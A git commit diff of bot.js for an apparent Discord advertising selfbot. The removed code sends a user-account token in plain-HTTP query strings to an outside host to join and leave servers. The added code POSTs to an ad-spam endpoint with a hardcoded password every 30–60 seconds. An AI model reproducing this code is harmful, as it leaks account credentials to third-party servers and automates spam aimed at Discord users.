ec3280d2759371a58ed5c213882ffec16d165359
DRL7N <40870933+DRL7N@users.noreply.github.com>
2018-12-06 22:36:23 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,64 +1,13 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
 const fetch = require('node-fetch');
-const USER = new Discord.Client();
-const { BOTID , INVITE ,GUILD , ONLYADVERT, sinceLastLJ, cachedDMS,  USERID, CHANNELID, OWNERS, PREFIX} = require('./system');
+
+let min = 30000;
+  let max = 60000;
+  let Rtime =  Math.floor(Math.random() * (max - min + 1)) + min;
+
+function msg(argument) {
+console.log('Done Send in  '+Rtime);
+     fetch('http://adsfordiscord.ueuo.com/index.php?pass=2499',{ method: 'POST'})
 
 
-client.on('ready', () => {
-   console.log(`Online: ${client.user.tag}\nGuilds: ${client.guilds.size}`);
-}).on("error", function(error) {
-  return console.log(error);
-}).on("message", message => {
-  let A = message.content.split(' ');
-  let S = A.join(' ');
-if (message.content.startsWith(S)) {
-if (message.author.id !== USERID) return;
-if (message.channel.guild) return;
-client.channels.get(CHANNELID).send(S);
 }
-});
-
-USER.on('ready', () => {
-  console.log(`Online: ${USER.user.tag}\nGuilds: ${USER.guilds.size}`);
-}).on("error", function(error) {
- return console.log(error);
-}).on("message", async message => {
-  if (message.author.id === USER.user.id) return;
-  if (message.channel.type !== "dm") return;
-  if (ONLYADVERT && !/discord\.gg\/\w+|bot\.discord\.io\/\w+|discordapp\.com\/invites\/\w+|discord\.me\/\w+/g.test(message.content)) return;
-  let owner = USER.users.get(BOTID);
-  let over = Date.now() - sinceLastLJ < 60000 ? "أقل من دقيقة بعد دخولي " : "عند دخولي مباشرة"
-  if (!owner) {
-      let msg = {
-          content: message.content,
-          author: {
-              id: message.author.id,
-              tag: message.author.tag
-          },over
-      }
-      return cachedDMS.push(msg)
-  }
-let txt = `**User:** ${message.author.tag} \`${message.author.id}\`\n**Time msg:** ${over}\n**Link:** \n ${message.content}`
-  try {
-      await owner.send(txt)
-  } catch (err) {
-      console.log("لا استطيع ارسال الرسالة")
-  }
-});
-
-client.on("message", async message => {
-    if (message.content == PREFIX + 'hjoin') {
-    if ( message.channel.id !== CHANNELID) return; 
-    if (!OWNERS.includes(message.author.id)) return;
-       fetch('http://antispambot.freeoda.com/joi.php?token='+process.env.TOKENUSER+'&invite='+INVITE,{ method: 'POST'});
-       message.channel.send(`**دخل إلى السيرفر بنجاح**`).then(msg => msg.delete(10000));
-    } else if (message.content == PREFIX + 'hleave') {
-           if (message.channel.id !== CHANNELID) return;
-           if (!OWNERS.includes(message.author.id)) return;
-       fetch('http://antispambot.freeoda.com/lev.php?token='+process.env.TOKENUSER+'&guilds='+GUILD, { method: 'POST'});
-       message.channel.send(`**خرج من السيرفر بنجاح**`).then(msg => msg.delete(10000));
-    }
-});
-
-USER.login(process.env.TOKENUSER);
+setInterval(msg,Rtime);
